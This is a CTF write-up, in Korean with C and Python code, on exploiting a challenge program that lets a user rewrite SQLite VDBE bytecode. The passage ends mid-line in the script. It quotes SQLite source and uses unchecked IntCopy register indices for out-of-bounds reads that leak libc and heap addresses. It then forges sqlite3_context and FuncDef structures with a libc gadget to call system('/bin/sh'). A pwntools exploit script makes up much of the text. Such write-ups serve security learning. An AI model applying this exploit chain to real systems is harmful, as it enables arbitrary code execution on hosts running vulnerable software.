p-\u0026gt;eVdbeState==VDBE_RUN_STATE ); /* sqlite3_step() verifies this */ if( DbMaskNonZero(p-\u0026gt;lockMask) ){ sqlite3VdbeEnter(p); } #ifndef SQLITE_OMIT_PROGRESS_CALLBACK if( db-\u0026gt;xProgress ){ u32 iPrior = p-\u0026gt;aCounter[SQLITE_STMTSTATUS_VM_STEP]; assert( 0 \u0026lt; db-\u0026gt;nProgressOps ); nProgressLimit = db-\u0026gt;nProgressOps - (iPrior % db-\u0026gt;nProgressOps); }else{ nProgressLimit = LARGEST_UINT64; } #endif if( p-\u0026gt;rc==SQLITE_NOMEM ){ /* This happens if a malloc() inside a call to sqlite3_column_text() or ** sqlite3_column_text16() failed. */ goto no_mem; } assert( p-\u0026gt;rc==SQLITE_OK || (p-\u0026gt;rc\u0026amp;0xff)==SQLITE_BUSY ); testcase( p-\u0026gt;rc!=SQLITE_OK ); p-\u0026gt;rc = SQLITE_OK; assert( p-\u0026gt;bIsReader || p-\u0026gt;readOnly!=0 ); p-\u0026gt;iCurrentTime = 0; assert( p-\u0026gt;explain==0 ); db-\u0026gt;busyHandler.nBusy = 0; if( AtomicLoad(\u0026amp;db-\u0026gt;u1.isInterrupted) ) goto abort_due_to_interrupt; sqlite3VdbeIOTraceSql(p); #ifdef SQLITE_DEBUG sqlite3BeginBenignMalloc(); if( p-\u0026gt;pc==0 \u0026amp;\u0026amp; (p-\u0026gt;db-\u0026gt;flags \u0026amp; (SQLITE_VdbeListing|SQLITE_VdbeEQP|SQLITE_VdbeTrace))!=0 ){ int i; int once = 1; sqlite3VdbePrintSql(p); if( p-\u0026gt;db-\u0026gt;flags \u0026amp; SQLITE_VdbeListing ){ printf(\u0026#34;VDBE Program Listing:\\n\u0026#34;); for(i=0; i\u0026lt;p-\u0026gt;nOp; i++){ sqlite3VdbePrintOp(stdout, i, \u0026amp;aOp[i]); } } if( p-\u0026gt;db-\u0026gt;flags \u0026amp; SQLITE_VdbeEQP ){ for(i=0; i\u0026lt;p-\u0026gt;nOp; i++){ if( aOp[i].opcode==OP_Explain ){ if( once ) printf(\u0026#34;VDBE Query Plan:\\n\u0026#34;); printf(\u0026#34;%s\\n\u0026#34;, aOp[i].p4.z); once = 0; } } } if( p-\u0026gt;db-\u0026gt;flags \u0026amp; SQLITE_VdbeTrace ) printf(\u0026#34;VDBE Trace:\\n\u0026#34;); } sqlite3EndBenignMalloc(); #endif for(pOp=\u0026amp;aOp[p-\u0026gt;pc]; 1; pOp++){ /* Errors are detected by individual opcodes, with an immediate ** jumps to abort_due_to_error. */ assert( rc==SQLITE_OK ); assert( pOp\u0026gt;=aOp \u0026amp;\u0026amp; pOp\u0026lt;\u0026amp;aOp[p-\u0026gt;nOp]); nVmStep++; #if defined(VDBE_PROFILE) pOp-\u0026gt;nExec++; pnCycle = \u0026amp;pOp-\u0026gt;nCycle; if( sqlite3NProfileCnt==0 ) *pnCycle -= sqlite3Hwtime(); #elif defined(SQLITE_ENABLE_STMT_SCANSTATUS) if( bStmtScanStatus ){ pOp-\u0026gt;nExec++; pnCycle = \u0026amp;pOp-\u0026gt;nCycle; *pnCycle -= sqlite3Hwtime(); } #endif /* Only allow tracing if SQLITE_DEBUG is defined. */ #ifdef SQLITE_DEBUG if( db-\u0026gt;flags \u0026amp; SQLITE_VdbeTrace ){ sqlite3VdbePrintOp(stdout, (int)(pOp - aOp), pOp); test_trace_breakpoint((int)(pOp - aOp),pOp,p); } #endif /* Check to see if we need to simulate an interrupt. This only happens ** if we have a special test build. */ #ifdef SQLITE_TEST if( sqlite3_interrupt_count\u0026gt;0 ){ sqlite3_interrupt_count--; if( sqlite3_interrupt_count==0 ){ sqlite3_interrupt(db); } } #endif /* Sanity checking on other operands */ #ifdef SQLITE_DEBUG { u8 opProperty = sqlite3OpcodeProperty[pOp-\u0026gt;opcode]; if( (opProperty \u0026amp; OPFLG_IN1)!=0 ){ assert( pOp-\u0026gt;p1\u0026gt;0 ); assert( pOp-\u0026gt;p1\u0026lt;=(p-\u0026gt;nMem+1 - p-\u0026gt;nCursor) ); assert( memIsValid(\u0026amp;aMem[pOp-\u0026gt;p1]) ); assert( sqlite3VdbeCheckMemInvariants(\u0026amp;aMem[pOp-\u0026gt;p1]) ); REGISTER_TRACE(pOp-\u0026gt;p1, \u0026amp;aMem[pOp-\u0026gt;p1]); } if( (opProperty \u0026amp; OPFLG_IN2)!=0 ){ assert( pOp-\u0026gt;p2\u0026gt;0 ); assert( pOp-\u0026gt;p2\u0026lt;=(p-\u0026gt;nMem+1 - p-\u0026gt;nCursor) ); assert( memIsValid(\u0026amp;aMem[pOp-\u0026gt;p2]) ); assert( sqlite3VdbeCheckMemInvariants(\u0026amp;aMem[pOp-\u0026gt;p2]) ); REGISTER_TRACE(pOp-\u0026gt;p2, \u0026amp;aMem[pOp-\u0026gt;p2]); } if( (opProperty \u0026amp; OPFLG_IN3)!=0 ){ assert( pOp-\u0026gt;p3\u0026gt;0 ); assert( pOp-\u0026gt;p3\u0026lt;=(p-\u0026gt;nMem+1 - p-\u0026gt;nCursor) ); assert( memIsValid(\u0026amp;aMem[pOp-\u0026gt;p3]) ); assert( sqlite3VdbeCheckMemInvariants(\u0026amp;aMem[pOp-\u0026gt;p3]) ); REGISTER_TRACE(pOp-\u0026gt;p3, \u0026amp;aMem[pOp-\u0026gt;p3]); } if( (opProperty \u0026amp; OPFLG_OUT2)!=0 ){ assert( pOp-\u0026gt;p2\u0026gt;0 ); assert( pOp-\u0026gt;p2\u0026lt;=(p-\u0026gt;nMem+1 - p-\u0026gt;nCursor) ); memAboutToChange(p, \u0026amp;aMem[pOp-\u0026gt;p2]); } if( (opProperty \u0026amp; OPFLG_OUT3)!=0 ){ assert( pOp-\u0026gt;p3\u0026gt;0 ); assert( pOp-\u0026gt;p3\u0026lt;=(p-\u0026gt;nMem+1 - p-\u0026gt;nCursor) ); memAboutToChange(p, \u0026amp;aMem[pOp-\u0026gt;p3]); } } #endif #ifdef SQLITE_DEBUG pOrigOp = pOp; #endif switch( pOp-\u0026gt;opcode ){ /***************************************************************************** ** What follows is a massive switch statement where each case implements a ** separate instruction in the virtual machine. If we follow the usual ** indentation conventions, each case should be indented by 6 spaces. But ** that is a lot of wasted space on the left margin. So the code within ** the switch statement will break with convention and be flush-left. Another ** big comment (similar to this one) will mark the point in the code where ** we transition back to normal indentation. ** ** The formatting of each case is important. The makefile for SQLite ** generates two C files \u0026#34;opcodes.h\u0026#34; and \u0026#34;opcodes.c\u0026#34; by scanning this ** file looking for lines that begin with \u0026#34;case OP_\u0026#34;. The opcodes.h files ** will be filled with #defines that give unique integer values to each ** opcode and the opcodes.c file is filled with an array of strings where ** each string is the symbolic name for the corresponding opcode. If the ** case statement is followed by a comment of the form \u0026#34;/# same as ... #/\u0026#34; ** that comment is used to determine the particular value of the opcode. ** ** Other keywords in the comment that follows each case are used to ** construct the OPFLG_INITIALIZER value that initializes opcodeProperty[]. ** Keywords include: in1, in2, in3, out2, out3. See ** the mkopcodeh.awk script for additional information. ** ** Documentation about VDBE opcodes is generated by scanning this file ** for lines of that contain \u0026#34;Opcode:\u0026#34;. That line and all subsequent ** comment lines are used in the generation of the opcode.html documentation ** file. ** ** SUMMARY: ** ** Formatting is important to scripts that scan this file. ** Do not deviate from the formatting style currently in use. ** *****************************************************************************/ /* Opcode: Goto * P2 * * * ** ** An unconditional jump to address P2. ** The next instruction executed will be ** the one at index P2 from the beginning of ** the program. ** ** The P1 parameter is not actually used by this opcode. However, it ** is sometimes set to 1 instead of 0 as a hint to the command-line shell ** that this Goto is the bottom of a loop and that the lines from P2 down ** to the current line should be indented for EXPLAIN output. */ case OP_Goto: { /* jump */ #ifdef SQLITE_DEBUG /* In debugging mode, when the p5 flags is set on an OP_Goto, that ** means we should really jump back to the preceding OP_ReleaseReg ** instruction. */ if( pOp-\u0026gt;p5 ){ assert( pOp-\u0026gt;p2 \u0026lt; (int)(pOp - aOp) ); assert( pOp-\u0026gt;p2 \u0026gt; 1 ); pOp = \u0026amp;aOp[pOp-\u0026gt;p2 - 2]; assert( pOp[1].opcode==OP_ReleaseReg ); goto check_for_interrupt; } #endif 이런식으로 Opcode에 따라 switch case로 처리한다.\nExploitation 먼저 악용할만한 opcode를 먼저 찾으려고 주석으로 달린 synopsis를 읽었다.\nOP_Copy = 80# /* synopsis: r[P2@P3+1]=r[P1@P3+1] */ OP_SCopy = 81# /* synopsis: r[P2]=r[P1] */ OP_IntCopy = 82# /* synopsis: r[P2]=r[P1] Copy 계열 명령어를 보다가 IntCopy를 쓰기로 결정했다.\n/* Opcode: IntCopy P1 P2 * * * ** Synopsis: r[P2]=r[P1] ** ** Transfer the integer value held in register P1 into register P2. ** ** This is an optimized version of SCopy that works only for integer ** values. */ case OP_IntCopy: { /* out2 */ pIn1 = \u0026amp;aMem[pOp-\u0026gt;p1]; assert( (pIn1-\u0026gt;flags \u0026amp; MEM_Int)!=0 ); pOut = \u0026amp;aMem[pOp-\u0026gt;p2]; sqlite3VdbeMemSetInt64(pOut, pIn1-\u0026gt;u.i); break; } 기본적으로 prepare로 점화된 바이트 코드를 신뢰하기 때문에 별도의 boundary check가 없다. 그래서 memory에 대한 Out of bound read가 가능해진다.\nstruct sqlite3_value { MemValue u; char *z; int n; u16 flags; u8 enc; u8 eSubtype; sqlite3 *db; int szMalloc; u32 uTemp; char *zMalloc; void (*xDel)(void *); }; 그런데 약간 성가신게 메모리 배열의 하나의 원소가 sqlite3_value라서 0x38의 배수 단위로만 메모리 액세스가 가능했다.\nmem_dump.py 실제 메모리 구조체의 첫 8바이트만 액세스가 가능하니 유효한 주소를 유출할 수 있도록 0x38의 배수 단위로 탐색을 진행했다.\nimport gdb import struct y = int(input(\u0026#39;base sqliteMem: \u0026#39;),16) inf = gdb.selected_inferior() for i in range(200): mem = struct.unpack(\u0026#39;\u0026lt;Q\u0026#39;,inf.read_memory(y-0x38*i, 0x8)) print(hex(y-0x38*i) + f\u0026#39;({-i})\u0026#39; +\u0026#39; : \u0026#39; + hex(mem[0])) `\nMemory leak payload = b\u0026#39;SELECT \u0026#39; for i in range(0x20): payload += f\u0026#39;(SELECT {i}),\u0026#39;.encode() payload = payload[:-1] prepare(1,payload) pc = 1 payload = compile(OP_Init, 0, pc) # jmp to pc payload += compile(OP_Integer,0x1, 1) payload += compile(OP_IntCopy, (-146)\u0026amp;0xffffffff, 1) payload += compile(OP_ResultRow, 1, 1) # p2 = col count payload += compile(OP_Halt) modify_opcode(1, payload) exec_q(1) libc_base = int(p.recvuntil(b\u0026#39; \u0026#39;)[:-1]) - 0x21ace0 log.success(hex(libc_base)) \u0026#39;\u0026#39;\u0026#39; OP_SCopy = 81# /* synopsis: r[P2]=r[P1] */ OP_IntCopy = 82# /* synopsis: r[P2]=r[P1] */ \u0026#39;\u0026#39;\u0026#39; payload = compile(OP_Init, 0, pc) # jmp to pc payload += compile(OP_Integer,0x1, 1) payload += compile(OP_IntCopy, (-0xb8)\u0026amp;0xffffffff, 1) payload += compile(OP_ResultRow, 1, 1) # p2 = col count payload += compile(OP_Halt) modify_opcode(1, payload) exec_q(1) heap_base = int(p.recvuntil(b\u0026#39; \u0026#39;)[:-1])-0x14578 log.success(hex(heap_base)) 일부러 SELECT 하고 서브 쿼리를 많이 추가해서 nOps를 늘린 상태에서 opcode를 수정했다.\nCode Execution Code execution전에 먼저 memory에 연속적으로 원하는 데이터를 쓸 수 있어야한다. sqlite3의 blob 데이터 타입을 이용하면 heap 영역에 연속적으로 데이터를 쓸 수 있다.\n위 primitive를 이용해서 객체의 주소를 변조하고 그 객체의 virtual function call을 가로채는 방법이 충분히 가능할 것이라고 생각했다. 모든 Opcode를 살펴봤지만, vfcall(controllable_rdi)의 꼴인 함수 호출이 존재하지 않았다. one gadget을 사용하지 않고 좀 더 안정적인 익스플로잇을 위해서 구조체 변조가 쉽고 가능한 많은 인자가 컨트롤 가능한 Opcode를 찾았다. case OP_PureFunc: /* group */ case OP_Function: { /* group */ int i; sqlite3_context *pCtx; assert( pOp-\u0026gt;p4type==P4_FUNCCTX ); pCtx = pOp-\u0026gt;p4.pCtx; /* If this function is inside of a trigger, the register array in aMem[] ** might change from one evaluation to the next. The next block of code ** checks to see if the register array has changed, and if so it ** reinitializes the relevant parts of the sqlite3_context object */ pOut = \u0026amp;aMem[pOp-\u0026gt;p3]; if( pCtx-\u0026gt;pOut != pOut ){ pCtx-\u0026gt;pVdbe = p; pCtx-\u0026gt;pOut = pOut; pCtx-\u0026gt;enc = encoding; for(i=pCtx-\u0026gt;argc-1; i\u0026gt;=0; i--) pCtx-\u0026gt;argv[i] = \u0026amp;aMem[pOp-\u0026gt;p2+i]; } assert( pCtx-\u0026gt;pVdbe==p ); memAboutToChange(p, pOut); #ifdef SQLITE_DEBUG for(i=0; i\u0026lt;pCtx-\u0026gt;argc; i++){ assert( memIsValid(pCtx-\u0026gt;argv[i]) ); REGISTER_TRACE(pOp-\u0026gt;p2+i, pCtx-\u0026gt;argv[i]); } #endif MemSetTypeFlag(pOut, MEM_Null); assert( pCtx-\u0026gt;isError==0 ); (*pCtx-\u0026gt;pFunc-\u0026gt;xSFunc)(pCtx, pCtx-\u0026gt;argc, pCtx-\u0026gt;argv);/* IMP: R-24505-23230 */ /* If the function returned an error, throw an exception */ if( pCtx-\u0026gt;isError ){ if( pCtx-\u0026gt;isError\u0026gt;0 ){ sqlite3VdbeError(p, \u0026#34;%s\u0026#34;, sqlite3_value_text(pOut)); rc = pCtx-\u0026gt;isError; } sqlite3VdbeDeleteAuxData(db, \u0026amp;p-\u0026gt;pAuxData, pCtx-\u0026gt;iOp, pOp-\u0026gt;p1); pCtx-\u0026gt;isError = 0; if( rc ) goto abort_due_to_error; } assert( (pOut-\u0026gt;flags\u0026amp;MEM_Str)==0 || pOut-\u0026gt;enc==encoding || db-\u0026gt;mallocFailed ); assert( !sqlite3VdbeMemTooBig(pOut) ); REGISTER_TRACE(pOp-\u0026gt;p3, pOut); UPDATE_MAX_BLOBSIZE(pOut); break; } 조건도 heap base를 알고 있으므로 아주 쉽게 우회가 가능하다.\nstruct sqlite3_context { Mem *pOut; /* The return value is stored here */ FuncDef *pFunc; /* Pointer to function information */ Mem *pMem; /* Memory cell used to store aggregate context */ Vdbe *pVdbe; /* The VM that owns this context */ int iOp; /* Instruction number of OP_Function */ int isError; /* Error code returned by the function. */ u8 enc; /* Encoding to use for results */ u8 skipFlag; /* Skip accumulator loading if true */ u8 argc; /* Number of arguments */ sqlite3_value *argv[1]; /* Argument set */ }; struct FuncDef { i8 nArg; /* Number of arguments. -1 means unlimited */ u32 funcFlags; /* Some combination of SQLITE_FUNC_* */ void *pUserData; /* User data parameter */ FuncDef *pNext; /* Next function with same name */ void (*xSFunc)(sqlite3_context*,int,sqlite3_value**); /* func or agg-step */ void (*xFinalize)(sqlite3_context*); /* Agg finalizer */ void (*xValue)(sqlite3_context*); /* Current agg value */ void (*xInverse)(sqlite3_context*,int,sqlite3_value**); /* inverse agg-step */ const char *zName; /* SQL name of the function. */ union { FuncDef *pHash; /* Next with a different name but the same hash */ FuncDestructor *pDestructor; /* Reference counted destructor function */ } u; /* pHash if SQLITE_FUNC_BUILTIN, pDestructor otherwise */ }; system(\u0026quot;/bin/sh\u0026quot;)를 호출하기 위해서는 한번의 code reuse가 필요하다. 호출시에 rdi == rax이고 rdi는 현재 객체이다. 그래서 다음과 같은 가젯을 이용한다.\n0x000000000009097f : mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x360] 위 가젯을 이용해서 자기 자신 객체를 다시 참조해서 rdi를 수정하고 호출한다.\n# sqlite3_context payload = b\u0026#39;\u0026#39; # scopy 0x18 payload += p64(mem_start + 0x0) # Mem * pOut \u0026lt;- Mem[0] address, p3 must be 0 payload += p64(payload_start+0x38) # FuncDef *pFunc payload += p64(payload_start + 0x18) # /bin/sh payload += b\u0026#39;/bin/sh\\x00\u0026#39; payload += p32(0) * 2 payload += p8(0) * 2 payload += p8(1) + p8(0) * 5 # argc = 1 payload += p64(0) # argv * # FuncDef payload += p64(0) *3 payload += p64(libc_base + 0x000000000009097f) payload += b\u0026#39;\\x00\u0026#39; * (0x360 - len(payload)) payload += p64(libc_base + libc.sym.system-0x46e) # do_system + 2 Exploit script OP_Savepoint = 0# OP_AutoCommit = 1# OP_Transaction = 2# OP_Checkpoint = 3# OP_JournalMode = 4# OP_Vacuum = 5# OP_VFilter = 6# /* jump, synopsis: iplan=r[P3] zplan=\u0026#39;P4\u0026#39; */ OP_VUpdate = 7# /* synopsis: data=r[P3@P2] */ OP_Init = 8# /* jump, synopsis: Start at P2 */ OP_Goto = 9# /* jump */ OP_Gosub = 10# /* jump */ OP_InitCoroutine = 11# /* jump */ OP_Yield = 12# /* jump */ OP_MustBeInt = 13# /* jump */ OP_Jump = 14# /* jump */ OP_Once = 15# /* jump */ OP_If = 16# /* jump */ OP_IfNot = 17# /* jump */ OP_IsType = 18# /* jump, synopsis: if typeof(P1.P3) in P5 goto P2 */ OP_Not = 19# /* same as TK_NOT, synopsis: r[P2]= !r[P1] */ OP_IfNullRow = 20# /* jump, synopsis: if P1.nullRow then r[P3]=NULL, goto P2 */ OP_SeekLT = 21# /* jump, synopsis: key=r[P3@P4] */ OP_SeekLE = 22# /* jump, synopsis: key=r[P3@P4] */ OP_SeekGE = 23# /* jump, synopsis: key=r[P3@P4] */ OP_SeekGT = 24# /* jump, synopsis: key=r[P3@P4] */ OP_IfNotOpen = 25# /* jump, synopsis: if( !csr[P1] ) goto P2 */ OP_IfNoHope = 26# /* jump, synopsis: key=r[P3@P4] */ OP_NoConflict = 27# /* jump, synopsis: key=r[P3@P4] */ OP_NotFound = 28# /* jump, synopsis: key=r[P3@P4] */ OP_Found = 29# /* jump, synopsis: key=r[P3@P4] */ OP_SeekRowid = 30# /* jump, synopsis: intkey=r[P3] */ OP_NotExists = 31# /* jump, synopsis: intkey=r[P3] */ OP_Last = 32# /* jump */ OP_IfSmaller = 33# /* jump */ OP_SorterSort = 34# /* jump */ OP_Sort = 35# /* jump */ OP_Rewind = 36# /* jump */ OP_SorterNext = 37# /* jump */ OP_Prev = 38# /* jump */ OP_Next = 39# /* jump */ OP_IdxLE = 40# /* jump, synopsis: key=r[P3@P4] */ OP_IdxGT = 41# /* jump, synopsis: key=r[P3@P4] */ OP_IdxLT = 42# /* jump, synopsis: key=r[P3@P4] */ OP_Or = 43# /* same as TK_OR, synopsis: r[P3]=(r[P1] || r[P2]) */ OP_And = 44# /* same as TK_AND, synopsis: r[P3]=(r[P1] \u0026amp;\u0026amp; r[P2]) */ OP_IdxGE = 45# /* jump, synopsis: key=r[P3@P4] */ OP_RowSetRead = 46# /* jump, synopsis: r[P3]=rowset(P1) */ OP_RowSetTest = 47# /* jump, synopsis: if r[P3] in rowset(P1) goto P2 */ OP_Program = 48# /* jump */ OP_FkIfZero = 49# /* jump, synopsis: if fkctr[P1]==0 goto P2 */ OP_IsNull = 50# /* jump, same as TK_ISNULL, synopsis: if r[P1]==NULL goto P2 */ OP_NotNull = 51# /* jump, same as TK_NOTNULL, synopsis: if r[P1]!=NULL goto P2 */ OP_Ne = 52# /* jump, same as TK_NE, synopsis: IF r[P3]!=r[P1] */ OP_Eq = 53# /* jump, same as TK_EQ, synopsis: IF r[P3]==r[P1] */ OP_Gt = 54# /* jump, same as TK_GT, synopsis: IF r[P3]\u0026gt;r[P1] */ OP_Le = 55# /* jump, same as TK_LE, synopsis: IF r[P3]\u0026lt;=r[P1] */ OP_Lt = 56# /* jump, same as TK_LT, synopsis: IF r[P3]\u0026lt;r[P1] */ OP_Ge = 57# /* jump, same as TK_GE, synopsis: IF r[P3]\u0026gt;=r[P1] */ OP_ElseEq = 58# /* jump, same as TK_ESCAPE */ OP_IfPos = 59# /* jump, synopsis: if r[P1]\u0026gt;0 then r[P1]-=P3, goto P2 */ OP_IfNotZero = 60# /* jump, synopsis: if r[P1]!=0 then r[P1]--, goto P2 */ OP_DecrJumpZero = 61# /* jump, synopsis: if (--r[P1])==0 goto P2 */ OP_IncrVacuum = 62# /* jump */ OP_VNext = 63# /* jump */ OP_Filter = 64# /* jump, synopsis: if key(P3@P4) not in filter(P1) goto P2 */ OP_PureFunc = 65# /* synopsis: r[P3]=func(r[P2@NP]) */ OP_Function = 66# /* synopsis: r[P3]=func(r[P2@NP]) */ OP_Return = 67# OP_EndCoroutine = 68# OP_HaltIfNull = 69# /* synopsis: if r[P3]=null halt */ OP_Halt = 70# OP_Integer = 71# /* synopsis: r[P2]=P1 */ OP_Int64 = 72# /* synopsis: r[P2]=P4 */ OP_String = 73# /* synopsis: r[P2]=\u0026#39;P4\u0026#39; (len=P1) */ OP_BeginSubrtn = 74# /* synopsis: r[P2]=NULL */ OP_Null = 75# /* synopsis: r[P2..P3]=NULL */ OP_SoftNull = 76# /* synopsis: r[P1]=NULL */ OP_Blob = 77# /* synopsis: r[P2]=P4 (len=P1) */ OP_Variable = 78# /* synopsis: r[P2]=parameter(P1,P4) */ OP_Move = 79# /* synopsis: r[P2@P3]=r[P1@P3] */ OP_Copy = 80# /* synopsis: r[P2@P3+1]=r[P1@P3+1] */ OP_SCopy = 81# /* synopsis: r[P2]=r[P1] */ OP_IntCopy = 82# /* synopsis: r[P2]=r[P1] */ OP_FkCheck = 83# OP_ResultRow = 84# /* synopsis: output=r[P1@P2] */ OP_CollSeq = 85# OP_AddImm = 86# /* synopsis: r[P1]=r[P1]+P2 */ OP_RealAffinity = 87# OP_Cast = 88# /* synopsis: affinity(r[P1]) */ OP_Permutation = 89# OP_Compare = 90# /* synopsis: r[P1@P3] \u0026lt;-\u0026gt; r[P2@P3] */ OP_IsTrue = 91# /* synopsis: r[P2] = coalesce(r[P1]==TRUE,P3) ^ P4 */ OP_ZeroOrNull = 92# /* synopsis: r[P2] = 0 OR NULL */ OP_Offset = 93# /* synopsis: r[P3] = sqlite_offset(P1) */ OP_Column = 94# /* synopsis: r[P3]=PX cursor P1 column P2 */ OP_TypeCheck = 95# /* synopsis: typecheck(r[P1@P2]) */ OP_Affinity = 96# /* synopsis: affinity(r[P1@P2]) */ OP_MakeRecord = 97# /* synopsis: r[P3]=mkrec(r[P1@P2]) */ OP_Count = 98# /* synopsis: r[P2]=count() */ OP_ReadCookie = 99# OP_SetCookie =100# OP_ReopenIdx =101# /* synopsis: root=P2 iDb=P3 */ OP_BitAnd =102# /* same as TK_BITAND, synopsis: r[P3]=r[P1]\u0026amp;r[P2] */ OP_BitOr =103# /* same as TK_BITOR, synopsis: r[P3]=r[P1]|r[P2] */ OP_ShiftLeft =104# /* same as TK_LSHIFT, synopsis: r[P3]=r[P2]\u0026lt;\u0026lt;r[P1] */ OP_ShiftRight =105# /* same as TK_RSHIFT, synopsis: r[P3]=r[P2]\u0026gt;\u0026gt;r[P1] */ OP_Add =106# /* same as TK_PLUS, synopsis: r[P3]=r[P1]+r[P2] */ OP_Subtract =107# /* same as TK_MINUS, synopsis: r[P3]=r[P2]-r[P1] */ OP_Multiply =108# /* same as TK_STAR, synopsis: r[P3]=r[P1]*r[P2] */ OP_Divide =109# /* same as TK_SLASH, synopsis: r[P3]=r[P2]/r[P1] */ OP_Remainder =110# /* same as TK_REM, synopsis: r[P3]=r[P2]%r[P1] */ OP_Concat =111# /* same as TK_CONCAT, synopsis: r[P3]=r[P2]+r[P1] */ OP_OpenRead =112# /* synopsis: root=P2 iDb=P3 */ OP_OpenWrite =113# /* synopsis: root=P2 iDb=P3 */ OP_BitNot =114# /* same as TK_BITNOT, synopsis: r[P2]= ~r[P1] */ OP_OpenDup =115# OP_OpenAutoindex =116# /* synopsis: nColumn=P2 */ OP_String8 =117# /* same as TK_STRING, synopsis: r[P2]=\u0026#39;P4\u0026#39; */ OP_OpenEphemeral =118# /* synopsis: nColumn=P2 */ OP_SorterOpen =119# OP_SequenceTest =120# /* synopsis: if( cursor[P1].ctr++ ) pc = P2 */ OP_OpenPseudo =121# /* synopsis: P3 columns in r[P2] */ OP_Close =122# OP_ColumnsUsed =123# OP_SeekScan =124# /* synopsis: Scan-ahead up to P1 rows */ OP_SeekHit =125# /* synopsis: set P2\u0026lt;=seekHit\u0026lt;=P3 */ OP_Sequence =126# /* synopsis: r[P2]=cursor[P1].ctr++ */ OP_NewRowid =127# /* synopsis: r[P2]=rowid */ OP_Insert =128# /* synopsis: intkey=r[P3] data=r[P2] */ OP_RowCell =129# OP_Delete =130# OP_ResetCount =131# OP_SorterCompare =132# /* synopsis: if key(P1)!=trim(r[P3],P4) goto P2 */ OP_SorterData =133# /* synopsis: r[P2]=data */ OP_RowData =134# /* synopsis: r[P2]=data */ OP_Rowid =135# /* synopsis: r[P2]=PX rowid of P1 */ OP_NullRow =136# OP_SeekEnd =137# OP_IdxInsert =138# /* synopsis: key=r[P2] */ OP_SorterInsert =139# /* synopsis: key=r[P2] */ OP_IdxDelete =140# /* synopsis: key=r[P2@P3] */ OP_DeferredSeek =141# /* synopsis: Move P3 to P1.rowid if needed */ OP_IdxRowid =142# /* synopsis: r[P2]=rowid */ OP_FinishSeek =143# OP_Destroy =144# OP_Clear =145# OP_ResetSorter =146# OP_CreateBtree =147# /* synopsis: r[P2]=root iDb=P1 flags=P3 */ OP_SqlExec =148# OP_ParseSchema =149# OP_LoadAnalysis =150# OP_DropTable =151# OP_DropIndex =152# OP_Real =153# /* same as TK_FLOAT, synopsis: r[P2]=P4 */ OP_DropTrigger =154# OP_IntegrityCk =155# OP_RowSetAdd =156# /* synopsis: rowset(P1)=r[P2] */ OP_Param =157# OP_FkCounter =158# /* synopsis: fkctr[P1]+=P2 */ OP_MemMax =159# /* synopsis: r[P1]=max(r[P1],r[P2]) */ OP_OffsetLimit =160# /* synopsis: if r[P1]\u0026gt;0 then r[P2]=r[P1]+max(0,r[P3]) else r[P2]=(-1) */ OP_AggInverse =161# /* synopsis: accum=r[P3] inverse(r[P2@P5]) */ OP_AggStep =162# /* synopsis: accum=r[P3] step(r[P2@P5]) */ OP_AggStep1 =163# /* synopsis: accum=r[P3] step(r[P2@P5]) */ OP_AggValue =164# /* synopsis: r[P3]=value N=P2 */ OP_AggFinal =165# /* synopsis: accum=r[P1] N=P2 */ OP_Expire =166# OP_CursorLock =167# OP_CursorUnlock =168# OP_TableLock =169# /* synopsis: iDb=P1 root=P2 write=P3 */ OP_VBegin =170# OP_VCreate =171# OP_VDestroy =172# OP_VOpen =173# OP_VCheck =174# OP_VInitIn =175# /* synopsis: r[P2]=ValueList(P1,P3) */ OP_VColumn =176# /* synopsis: r[P3]=vcolumn(P2) */ OP_VRename =177# OP_Pagecount =178# OP_MaxPgcnt =179# OP_ClrSubtype =180# /* synopsis: r[P1].subtype = 0 */ OP_FilterAdd =181# /* synopsis: filter(P1) += key(P3@P4) */ OP_Trace =182# OP_CursorHint =183# OP_ReleaseReg =184# /* synopsis: release r[P1@P2] mask P3 */ OP_Noop =185# OP_Explain =186# OP_Abortable =187# OPFLG_JUMP = 0x01# /* jump: P2 holds jmp target */ OPFLG_IN1 = 0x02# /* in1: P1 is an input */ OPFLG_IN2 = 0x04# /* in2: P2 is an input */ OPFLG_IN3 = 0x08# /* in3: P3 is an input */ OPFLG_OUT2 = 0x10# /* out2: P2 is an output */ OPFLG_OUT3 = 0x20# /* out3: P3 is an output */ OPFLG_NCYCLE = 0x40# /* ncycle:Cycles count against P1 */ from pwn import * sla = lambda x,y : p.sendlineafter(x,y) p = process(\u0026#39;./chal\u0026#39;) e = ELF(\u0026#39;./chal\u0026#39;) libc = e.libc def prepare(idx, stmt): sla(b\u0026#39;Choice: \u0026#39;,str(1)) sla(b\u0026#39;? \u0026#39;,str(idx)) sla(b\u0026#39;line:\u0026#39;,stmt) def compile(opcode, p1 = 0, p2 = 0 , p3 = 0 ,p4 = 0 ,p4_type = 0, p5 = 0): payload = b\u0026#39;\u0026#39; payload += p8(opcode) payload += p8(p4_type) payload += p16(p5) payload += p32(p1) payload += p32(p2) payload += p32(p3) payload += p64(p4) return payload def modify_opcode(idx, vmcode): sla(b\u0026#39;Choice: \u0026#39;,str(5)) sla(b\u0026#39;? \u0026#39;,str(idx)) p.recvuntil(b\u0026#39;up to \u0026#39;) c = int(p.recvuntil(b\u0026#39;)\u0026#39;)[:-1],10) sla(b\u0026#39;? \u0026#39;,str(len(vmcode))) assert c%0x18 == 0 p.send(vmcode) def exec_q(idx): sla(b\u0026#39;Choice: \u0026#39;,str(2)) sla(b\u0026#39;? \u0026#39;,str(idx)) payload = b\u0026#39;SELECT \u0026#39; for i in range(0x20): payload += f\u0026#39;(SELECT {i}),\u0026#39;.encode() payload = payload[:-1] prepare(1,payload) pc = 1 payload = compile(OP_Init, 0, pc) # jmp to pc payload += compile(OP_Integer,0x1, 1) payload += compile(OP_IntCopy, (-146)\u0026amp;0xffffffff, 1) payload += compile(OP_ResultRow, 1, 1) # p2 = col count payload += compile(OP_Halt) modify_opcode(1, payload) exec_q(1) libc_base = int(p.recvuntil(b\u0026#39; \u0026#39;)[:-1]) - 0x21ace0 log.success(hex(libc_base)) \u0026#39;\u0026#39;\u0026#39; OP_SCopy = 81# /* synopsis: r[P2]=r[P1] */ OP_IntCopy = 82# /* synopsis: r[P2]=r[P1] */ \u0026#39;\u0026#39;\u0026#39; payload = compile(OP_Init, 0, pc) # jmp to pc payload += compile(OP_Integer,0x1, 1) payload += compile(OP_IntCopy, (-0xb8)\u0026amp;0xffffffff, 1) payload += compile(OP_ResultRow, 1, 1) # p2 = col count payload += compile(OP_Halt) modify_opcode(1, payload) exec_q(1) heap_base = int(p.recvuntil(b\u0026#39; \u0026#39;)[:-1])-0x14578 log.success(hex(heap_base)) mem_start = heap_base + 0x16e28 payload_start = heap_base + 